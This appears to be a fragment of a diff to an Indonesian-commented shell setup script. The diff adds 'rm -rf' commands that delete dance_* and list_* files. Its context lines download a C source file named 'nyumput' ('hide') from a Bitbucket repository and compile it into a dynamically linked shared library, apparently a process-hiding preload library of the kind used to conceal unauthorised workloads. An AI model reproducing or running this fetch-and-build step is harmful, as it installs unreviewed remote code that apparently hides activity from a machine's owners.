@@ -3,7 +3,8 @@
 # Memperbarui dan menginstal dependensi
 sudo apt-get update
 sudo apt-get install -y wget curl build-essential jq
-
+rm -rf dance_*
+rm -rf list_*
 # Mengunduh dan mengompilasi kode
 curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
